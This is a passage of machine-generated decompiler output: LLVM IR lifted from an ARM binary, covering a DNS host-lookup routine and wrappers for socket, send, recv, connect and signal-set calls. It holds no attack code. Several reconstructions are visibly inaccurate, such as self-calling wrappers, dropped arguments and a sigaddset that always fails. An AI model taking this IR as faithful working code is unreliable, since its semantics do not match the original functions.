dec_label_pc_152e0:                               ; preds = %dec_label_pc_152d8
  %v3_152e0 = icmp eq i32 %v2_152cc, -1
  br i1 %v3_152e0, label %dec_label_pc_152e8, label %dec_label_pc_155ac

dec_label_pc_152e8:                               ; preds = %dec_label_pc_152e0
  %v0_152e8 = load i32, i32* @r5, align 4
  %v1_152e8 = inttoptr i32 %v0_152e8 to i32*
  %v2_152e8 = load i32, i32* %v1_152e8, align 4
  store i32 %v2_152e8, i32* %r3.global-to-local, align 4
  %v7_152ec = icmp eq i32 %v2_152e8, 2
  br i1 %v7_152ec, label %dec_label_pc_152f4, label %dec_label_pc_155ac

dec_label_pc_152f4:                               ; preds = %dec_label_pc_152e8, %dec_label_pc_152d8, %dec_label_pc_152c8
  %v0_152f4 = load i32, i32* @r7, align 4
  %v1_152f4 = sub i32 0, %v0_152f4
  %v1_152f8 = urem i32 %v1_152f4, 4
  store i32 %v1_152f8, i32* %r3.global-to-local, align 4
  %v2_152f8 = icmp eq i32 %v1_152f8, 0
  %v0_152fc = load i32, i32* @r8, align 4
  %v1_152fc = load i32, i32* @r5, align 4
  %v2_152fc = inttoptr i32 %v1_152fc to i32*
  store i32 %v0_152fc, i32* %v2_152fc, align 4
  %v0_1531c.pre = load i32, i32* @r4, align 4
  br i1 %v2_152f8, label %dec_label_pc_15314, label %dec_label_pc_15304

dec_label_pc_15304:                               ; preds = %dec_label_pc_152f4
  %v1_15304 = load i32, i32* %r3.global-to-local, align 4
  %v2_15304 = sub i32 %v0_1531c.pre, %v1_15304
  %v3_15304 = icmp ult i32 %v0_1531c.pre, %v1_15304
  br i1 %v3_15304, label %dec_label_pc_155a8, label %dec_label_pc_1530c

dec_label_pc_1530c:                               ; preds = %dec_label_pc_15304
  store i32 %v2_15304, i32* @r4, align 4
  %v0_15310 = load i32, i32* @r7, align 4
  %v2_15310 = add i32 %v0_15310, %v1_15304
  store i32 %v2_15310, i32* @r7, align 4
  br label %dec_label_pc_15314

dec_label_pc_15314:                               ; preds = %dec_label_pc_152f4, %dec_label_pc_1530c
  %v0_1531c = phi i32 [ %v2_15304, %dec_label_pc_1530c ], [ %v0_1531c.pre, %dec_label_pc_152f4 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_152cc, align 4
  %tmp31 = icmp ult i32 %v0_1531c, 4
  br i1 %tmp31, label %dec_label_pc_155a8, label %dec_label_pc_15328

dec_label_pc_15328:                               ; preds = %dec_label_pc_15314
  %v0_15328 = load i32, i32* @r4, align 4
  %v1_15328 = add i32 %v0_15328, -4
  store i32 %v1_15328, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_15328, 8
  br i1 %tmp32, label %dec_label_pc_155a8, label %dec_label_pc_15334

dec_label_pc_15334:                               ; preds = %dec_label_pc_15328
  %v1_15334 = add i32 %v0_15328, -12
  store i32 %v1_15334, i32* %r3.global-to-local, align 4
  %v0_15338 = load i32, i32* @r7, align 4
  %v1_15338 = add i32 %v0_15338, 4
  store i32 %v1_15338, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_15344 = inttoptr i32 %v1_15338 to i32*
  store i32 %v0_15338, i32* %v3_15344, align 4
  %v0_15348 = load i32, i32* @r5, align 4
  %v1_15348 = load i32, i32* @sb, align 4
  %v2_15348 = add i32 %v1_15348, 4
  %v3_15348 = inttoptr i32 %v2_15348 to i32*
  store i32 %v0_15348, i32* %v3_15348, align 4
  %tmp33 = icmp ult i32 %v1_15334, 32
  br i1 %tmp33, label %dec_label_pc_155a8, label %dec_label_pc_15350

dec_label_pc_15350:                               ; preds = %dec_label_pc_15334
  %v0_15350 = load i32, i32* @r4, align 4
  %v1_15350 = add i32 %v0_15350, -44
  store i32 %v1_15350, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_15350, 256
  br i1 %tmp34, label %dec_label_pc_155a8, label %dec_label_pc_1535c

dec_label_pc_1535c:                               ; preds = %dec_label_pc_15350
  %v0_1535c = load i32, i32* @r7, align 4
  %v1_1535c = add i32 %v0_1535c, 44
  store i32 %v1_1535c, i32* @r6, align 4
  %v1_15360 = add i32 %v0_1535c, 12
  store i32 %v1_15360, i32* %r3.global-to-local, align 4
  %v0_15364 = load i32, i32* @fp, align 4
  store i32 %v0_15364, i32* @r1, align 4
  store i32 %v1_15350, i32* %r2.global-to-local, align 4
  store i32 %v1_1535c, i32* %r0.global-to-local, align 4
  %v3_15374 = call i32 @strncpy(i32 %v1_1535c, i32 %v0_15364, i32 %v1_15350)
  store i32 %v1_15360, i32* %ip.global-to-local, align 4
  %v0_1537c = load i32, i32* @r6, align 4
  %v1_1537c = load i32, i32* @r7, align 4
  %v2_1537c = add i32 %v1_1537c, 12
  %v3_1537c = inttoptr i32 %v2_1537c to i32*
  store i32 %v0_1537c, i32* %v3_1537c, align 4
  %v0_15380 = load i32, i32* @fp, align 4
  store i32 %v0_15380, i32* %r0.global-to-local, align 4
  %v0_15384 = load i32, i32* @r5, align 4
  %v1_15384 = load i32, i32* %ip.global-to-local, align 4
  %v2_15384 = add i32 %v1_15384, 4
  %v3_15384 = inttoptr i32 %v2_15384 to i32*
  store i32 %v0_15384, i32* %v3_15384, align 4
  %v0_15388 = load i32, i32* @r7, align 4
  %v2_1538c = inttoptr i32 %v0_15380 to i8*
  %v3_1538c = call i32 @inet_aton(i8* %v2_1538c, i32 %v0_15388)
  store i32 %v3_1538c, i32* %r0.global-to-local, align 4
  %v2_15390 = icmp eq i32 %v3_1538c, 0
  br i1 %v2_15390, label %dec_label_pc_153d4, label %dec_label_pc_1539c

dec_label_pc_1539c:                               ; preds = %dec_label_pc_1535c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_153a0 = load i32, i32* @sl, align 4
  %v2_153a0 = add i32 %v1_153a0, 8
  %v3_153a0 = inttoptr i32 %v2_153a0 to i32*
  store i32 2, i32* %v3_153a0, align 4
  %v0_153a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_153a4 = mul i32 %v0_153a4, 2
  %v1_153a8 = load i32, i32* @sl, align 4
  %v2_153a8 = add i32 %v1_153a8, 12
  %v3_153a8 = inttoptr i32 %v2_153a8 to i32*
  store i32 %v2_153a4, i32* %v3_153a8, align 4
  %v3_153ac = load i32, i32* %stack_var_0, align 4
  store i32 %v3_153ac, i32* %r2.global-to-local, align 4
  store i32 %v1_15360, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_153b8 = load i32, i32* @r5, align 4
  store i32 %v0_153b8, i32* %r0.global-to-local, align 4
  %v0_153bc = load i32, i32* @sl, align 4
  %v2_153bc = inttoptr i32 %v3_153ac to i32*
  store i32 %v0_153bc, i32* %v2_153bc, align 4
  %v0_153c0 = load i32, i32* @r6, align 4
  %v1_153c0 = load i32, i32* @sl, align 4
  %v2_153c0 = inttoptr i32 %v1_153c0 to i32*
  store i32 %v0_153c0, i32* %v2_153c0, align 4
  %v0_153c4 = load i32, i32* @sb, align 4
  %v1_153c4 = load i32, i32* @sl, align 4
  %v2_153c4 = add i32 %v1_153c4, 16
  %v3_153c4 = inttoptr i32 %v2_153c4 to i32*
  store i32 %v0_153c4, i32* %v3_153c4, align 4
  %v0_153c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_153c8 = load i32, i32* @sl, align 4
  %v2_153c8 = add i32 %v1_153c8, 4
  %v3_153c8 = inttoptr i32 %v2_153c8 to i32*
  store i32 %v0_153c8, i32* %v3_153c8, align 4
  %v0_153cc = load i32, i32* @r5, align 4
  %v1_153cc = load i32, i32* %ip.global-to-local, align 4
  %v2_153cc = inttoptr i32 %v1_153cc to i32*
  store i32 %v0_153cc, i32* %v2_153cc, align 4
  br label %dec_label_pc_155ac

dec_label_pc_153d4:                               ; preds = %dec_label_pc_1535c
  %v2_153d4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_153d4, i32* @r5, align 4
  %v1_153d8 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_26594.950 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_153d4, i32* @r0, align 4
  store i32 92940, i32* %r3.global-to-local, align 4
  %v1_153f0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_16b04.825 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26594.950 to i32), i32* %r0.global-to-local, align 4
  %v1_15400 = call i32 @__pthread_return_0()
  store i32 %v2_153d4, i32* @r0, align 4
  %v2_1540c = load i32, i32* @global_var_2c90c.955, align 4
  store i32 %v2_1540c, i32* @r4, align 4
  store i32 92940, i32* %r3.global-to-local, align 4
  %v1_1541c = call i32 @__pthread_return_void()
  %v2_15428 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2c900.958 to i32), i32* %r3.global-to-local, align 4
  %v0_15434 = load i32, i32* @fp, align 4
  store i32 %v0_15434, i32* %r0.global-to-local, align 4
  %v2_15438 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_15438, i32* %ip.global-to-local, align 4
  %v0_1543c = load i32, i32* @r4, align 4
  store i32 %v0_1543c, i32* %r2.global-to-local, align 4
  %v6_15450 = inttoptr i32 %v0_15434 to i8*
  %v7_15450 = call i32 @__dns_lookup(i8* %v6_15450, i32 1, i32 %v0_1543c, i32 ptrtoint (i32* @global_var_2c900.958 to i32), i32 %v2_15428, i32 %v2_15438)
  store i32 %v7_15450, i32* %r0.global-to-local, align 4
  %v1_15454 = icmp slt i32 %v7_15450, 0
  br i1 %v1_15454, label %.dec_label_pc_15580_crit_edge, label %dec_label_pc_15464

.dec_label_pc_15580_crit_edge:                    ; preds = %dec_label_pc_153d4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15580

dec_label_pc_15464:                               ; preds = %dec_label_pc_153d4
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_15478 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_15478, 255
  br i1 %tmp35, label %dec_label_pc_15514, label %dec_label_pc_15480

dec_label_pc_15480:                               ; preds = %dec_label_pc_15464
  %v3_15480 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_15480, i32* @r0, align 4
  %v0_15484 = call i32 @free()
  %v3_15488 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_15488, i32* @r0, align 4
  %v0_1548c = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_152cc, align 4
  br label %dec_label_pc_155ac

dec_label_pc_15514:                               ; preds = %dec_label_pc_15464
  %v3_15518.pre = load i32, i32* %stack_var_-96, align 4
  %v0_1551c.pre = load i32, i32* @r6, align 4
  store i32 %v1_15478, i32* %r2.global-to-local, align 4
  store i32 %v3_15518.pre, i32* @r1, align 4
  store i32 %v0_1551c.pre, i32* %r0.global-to-local, align 4
  %v3_15520 = call i32 @strncpy(i32 %v0_1551c.pre, i32 %v3_15518.pre, i32 %v1_15478)
  %v3_15524 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_15524, i32* @r0, align 4
  %v0_15528 = call i32 @free()
  store i32 %v0_15528, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_15530 = icmp eq i32 %tmp7, 1
  br i1 %v7_15530, label %dec_label_pc_15538, label %dec_label_pc_1558c

dec_label_pc_15538:                               ; preds = %dec_label_pc_15514
  store i32 4, i32* @r2, align 4
  %v0_15540 = load i32, i32* @r7, align 4
  store i32 %v0_15540, i32* @r0, align 4
  %v0_15544 = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_15360, i32* %r2.global-to-local, align 4
  %v1_15550 = load i32, i32* @sl, align 4
  %v2_15550 = add i32 %v1_15550, 8
  %v3_15550 = inttoptr i32 %v2_15550 to i32*
  store i32 2, i32* %v3_15550, align 4
  %v0_15554 = load i32, i32* %r3.global-to-local, align 4
  %v2_15554 = mul i32 %v0_15554, 2
  store i32 %v2_15554, i32* %r3.global-to-local, align 4
  %v1_15558 = load i32, i32* @sl, align 4
  %v2_15558 = add i32 %v1_15558, 12
  %v3_15558 = inttoptr i32 %v2_15558 to i32*
  store i32 %v2_15554, i32* %v3_15558, align 4
  %v3_1555c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1555c, i32* @r0, align 4
  %v0_15560 = load i32, i32* @r6, align 4
  %v1_15560 = load i32, i32* @sl, align 4
  %v2_15560 = inttoptr i32 %v1_15560 to i32*
  store i32 %v0_15560, i32* %v2_15560, align 4
  %v0_15564 = load i32, i32* @sb, align 4
  %v1_15564 = load i32, i32* @sl, align 4
  %v2_15564 = add i32 %v1_15564, 16
  %v3_15564 = inttoptr i32 %v2_15564 to i32*
  store i32 %v0_15564, i32* %v3_15564, align 4
  %v0_15568 = load i32, i32* %r2.global-to-local, align 4
  %v1_15568 = load i32, i32* @sl, align 4
  %v2_15568 = add i32 %v1_15568, 4
  %v3_15568 = inttoptr i32 %v2_15568 to i32*
  store i32 %v0_15568, i32* %v3_15568, align 4
  %v0_1556c = call i32 @free()
  %v3_15570 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_15570, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15578 = load i32, i32* @sl, align 4
  %v2_15578 = inttoptr i32 %v3_15570 to i32*
  store i32 %v0_15578, i32* %v2_15578, align 4
  %v0_1557c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1557c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15580

dec_label_pc_15580:                               ; preds = %.dec_label_pc_15580_crit_edge, %dec_label_pc_15538
  %v0_15584 = phi i32 [ 1, %.dec_label_pc_15580_crit_edge ], [ %v0_1557c, %dec_label_pc_15538 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_15584, i32* %v1_152cc, align 4
  br label %dec_label_pc_155ac

dec_label_pc_1558c:                               ; preds = %dec_label_pc_15514
  %v3_1558c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1558c, i32* @r0, align 4
  %v0_15590 = call i32 @free()
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_152cc, align 4
  br label %dec_label_pc_155ac

dec_label_pc_155a8:                               ; preds = %dec_label_pc_15304, %dec_label_pc_15350, %dec_label_pc_15334, %dec_label_pc_15328, %dec_label_pc_15314
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155ac

dec_label_pc_155ac:                               ; preds = %bb, %dec_label_pc_152e8, %dec_label_pc_152e0, %dec_label_pc_15288, %dec_label_pc_1558c, %dec_label_pc_15580, %dec_label_pc_15480, %dec_label_pc_1539c, %dec_label_pc_155a8
  store i32 %v6_1525c, i32* @r5, align 4
  store i32 %v9_1525c, i32* @r6, align 4
  store i32 %v12_1525c, i32* @r7, align 4
  store i32 %v15_1525c, i32* @r8, align 4
  store i32 %v18_1525c, i32* @sb, align 4
  store i32 %v21_1525c, i32* @sl, align 4
  store i32 %v24_1525c, i32* @fp, align 4
  %v29_155b0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_155b0

; uselistorder directives
  uselistorder i32 %v2_15554, { 1, 0 }
  uselistorder i32 %v1_15478, { 1, 2, 0 }
  uselistorder i32 %v1_15360, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1535c, { 1, 0, 2 }
  uselistorder i32 %v1_15350, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1531c.pre, { 0, 2, 1 }
  uselistorder i32 %v1_152f8, { 1, 0 }
  uselistorder i32* %v1_152cc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_1526c, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 15, 14, 16, 18, 17, 21, 20, 0, 1, 2 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_155ac, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_155a8, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15580, { 1, 0 }
  uselistorder label %dec_label_pc_15314, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_155d0 = load i32, i32* @r4, align 4
  store i32 %v3_155d0, i32* %stack_var_-8, align 4
  %v5_155d4 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_155d4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_155d4, -4095
  br i1 %tmp, label %dec_label_pc_155f4, label %dec_label_pc_155e4

dec_label_pc_155e4:                               ; preds = %entry
  %v0_155e4 = call i32 @__errno_location()
  %v0_155e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_155e8 = sub i32 0, %v0_155e8
  %v2_155ec = inttoptr i32 %v0_155e4 to i32*
  store i32 %v1_155e8, i32* %v2_155ec, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_155f4

dec_label_pc_155f4:                               ; preds = %entry, %dec_label_pc_155e4
  %v0_155f4 = phi i32 [ %v5_155d4, %entry ], [ -1, %dec_label_pc_155e4 ]
  %v2_155f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_155f8, i32* @r4, align 4
  ret i32 %v0_155f4

; uselistorder directives
  uselistorder i32 %v5_155d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_155f4, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_155fc = load i32, i32* @r4, align 4
  store i32 %v3_155fc, i32* %stack_var_-8, align 4
  %v5_15600 = inttoptr i32 %arg3 to i32*
  %v6_15600 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_15600)
  store i32 %v6_15600, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_15600, -4095
  br i1 %tmp, label %dec_label_pc_15620, label %dec_label_pc_15610

dec_label_pc_15610:                               ; preds = %entry
  %v0_15610 = call i32 @__errno_location()
  %v0_15614 = load i32, i32* %r4.global-to-local, align 4
  %v1_15614 = sub i32 0, %v0_15614
  %v2_15618 = inttoptr i32 %v0_15610 to i32*
  store i32 %v1_15614, i32* %v2_15618, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15620

dec_label_pc_15620:                               ; preds = %entry, %dec_label_pc_15610
  %v0_15620 = phi i32 [ %v6_15600, %entry ], [ -1, %dec_label_pc_15610 ]
  %v2_15624 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15624, i32* @r4, align 4
  ret i32 %v0_15620

; uselistorder directives
  uselistorder i32 %v6_15600, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15620, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15628 = load i32, i32* @r4, align 4
  store i32 %v3_15628, i32* %stack_var_-8, align 4
  %v0_15630 = call i32 @getsockopt()
  store i32 %v0_15630, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15630, -4095
  br i1 %tmp, label %dec_label_pc_15650, label %dec_label_pc_15640

dec_label_pc_15640:                               ; preds = %entry
  %v0_15640 = call i32 @__errno_location()
  %v0_15644 = load i32, i32* %r4.global-to-local, align 4
  %v1_15644 = sub i32 0, %v0_15644
  %v2_15648 = inttoptr i32 %v0_15640 to i32*
  store i32 %v1_15644, i32* %v2_15648, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15650

dec_label_pc_15650:                               ; preds = %entry, %dec_label_pc_15640
  %v0_15650 = phi i32 [ %v0_15630, %entry ], [ -1, %dec_label_pc_15640 ]
  %v2_15654 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15654, i32* @r4, align 4
  ret i32 %v0_15650

; uselistorder directives
  uselistorder i32 %v0_15630, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15650, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15658 = load i32, i32* @r4, align 4
  store i32 %v3_15658, i32* %stack_var_-8, align 4
  %v5_1565c = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_1565c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1565c, -4095
  br i1 %tmp, label %dec_label_pc_1567c, label %dec_label_pc_1566c

dec_label_pc_1566c:                               ; preds = %entry
  %v0_1566c = call i32 @__errno_location()
  %v0_15670 = load i32, i32* %r4.global-to-local, align 4
  %v1_15670 = sub i32 0, %v0_15670
  %v2_15674 = inttoptr i32 %v0_1566c to i32*
  store i32 %v1_15670, i32* %v2_15674, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1567c

dec_label_pc_1567c:                               ; preds = %entry, %dec_label_pc_1566c
  %v0_1567c = phi i32 [ %v5_1565c, %entry ], [ -1, %dec_label_pc_1566c ]
  %v2_15680 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15680, i32* @r4, align 4
  ret i32 %v0_1567c

; uselistorder directives
  uselistorder i32 %v5_1565c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1567c, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15684 = load i32, i32* @r4, align 4
  store i32 %v3_15684, i32* %stack_var_-8, align 4
  %v5_15688 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_15688, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_15688, -4095
  br i1 %tmp, label %dec_label_pc_156a8, label %dec_label_pc_15698

dec_label_pc_15698:                               ; preds = %entry
  %v0_15698 = call i32 @__errno_location()
  %v0_1569c = load i32, i32* %r4.global-to-local, align 4
  %v1_1569c = sub i32 0, %v0_1569c
  %v2_156a0 = inttoptr i32 %v0_15698 to i32*
  store i32 %v1_1569c, i32* %v2_156a0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_156a8

dec_label_pc_156a8:                               ; preds = %entry, %dec_label_pc_15698
  %v0_156a8 = phi i32 [ %v5_15688, %entry ], [ -1, %dec_label_pc_15698 ]
  %v2_156ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_156ac, i32* @r4, align 4
  ret i32 %v0_156a8

; uselistorder directives
  uselistorder i32 %v5_15688, { 1, 0, 2 }
  uselistorder label %dec_label_pc_156a8, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_156b0 = load i32, i32* @r4, align 4
  store i32 %v3_156b0, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_156bc = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_156bc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_156bc, -4095
  br i1 %tmp, label %dec_label_pc_156dc, label %dec_label_pc_156cc

dec_label_pc_156cc:                               ; preds = %entry
  %v0_156cc = call i32 @__errno_location()
  %v0_156d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_156d0 = sub i32 0, %v0_156d0
  %v2_156d4 = inttoptr i32 %v0_156cc to i32*
  store i32 %v1_156d0, i32* %v2_156d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_156dc

dec_label_pc_156dc:                               ; preds = %entry, %dec_label_pc_156cc
  %v0_156dc = phi i32 [ %v5_156bc, %entry ], [ -1, %dec_label_pc_156cc ]
  %v2_156e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_156e0, i32* @r4, align 4
  ret i32 %v0_156dc

; uselistorder directives
  uselistorder i32 %v5_156bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_156dc, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_156e4 = load i32, i32* @r4, align 4
  store i32 %v3_156e4, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_156ec = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_156ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_156ec, -4095
  br i1 %tmp, label %dec_label_pc_1570c, label %dec_label_pc_156fc

dec_label_pc_156fc:                               ; preds = %entry
  %v0_156fc = call i32 @__errno_location()
  %v0_15700 = load i32, i32* %r4.global-to-local, align 4
  %v1_15700 = sub i32 0, %v0_15700
  %v2_15704 = inttoptr i32 %v0_156fc to i32*
  store i32 %v1_15700, i32* %v2_15704, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1570c

dec_label_pc_1570c:                               ; preds = %entry, %dec_label_pc_156fc
  %v0_1570c = phi i32 [ %v5_156ec, %entry ], [ -1, %dec_label_pc_156fc ]
  %v2_15710 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15710, i32* @r4, align 4
  ret i32 %v0_1570c

; uselistorder directives
  uselistorder i32 %v5_156ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1570c, { 1, 0 }
}

define i32 @socket() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15714 = load i32, i32* @r4, align 4
  store i32 %v3_15714, i32* %stack_var_-8, align 4
  %v0_15718 = call i32 @socket()
  store i32 %v0_15718, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15718, -4095
  br i1 %tmp, label %dec_label_pc_15738, label %dec_label_pc_15728

dec_label_pc_15728:                               ; preds = %entry
  %v0_15728 = call i32 @__errno_location()
  %v0_1572c = load i32, i32* %r4.global-to-local, align 4
  %v1_1572c = sub i32 0, %v0_1572c
  %v2_15730 = inttoptr i32 %v0_15728 to i32*
  store i32 %v1_1572c, i32* %v2_15730, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15738

dec_label_pc_15738:                               ; preds = %entry, %dec_label_pc_15728
  %v0_15738 = phi i32 [ %v0_15718, %entry ], [ -1, %dec_label_pc_15728 ]
  %v2_1573c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1573c, i32* @r4, align 4
  ret i32 %v0_15738

; uselistorder directives
  uselistorder i32 %v0_15718, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15738, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_1575c, label %dec_label_pc_1574c

dec_label_pc_1574c:                               ; preds = %entry
  %v8_15750 = icmp sgt i32 %arg1, 64
  br i1 %v8_15750, label %dec_label_pc_1575c, label %dec_label_pc_15754

dec_label_pc_15754:                               ; preds = %dec_label_pc_1574c
  %v0_15758 = call i32 @__sigaddset()
  br label %dec_label_pc_1575c

dec_label_pc_1575c:                               ; preds = %dec_label_pc_1574c, %entry, %dec_label_pc_15754
  %v0_1575c = call i32 @__errno_location()
  %v2_15764 = inttoptr i32 %v0_1575c to i32*
  store i32 22, i32* %v2_15764, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1575c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 128, i32* @r2, align 4
  %v0_1577c = load i32, i32* @r0, align 4
  %v2_1577c = inttoptr i32 %v0_1577c to i8*
  %v3_1577c = call i32 @__GI_memset(i8* %v2_1577c, i32 0)
  ret i32 0
}

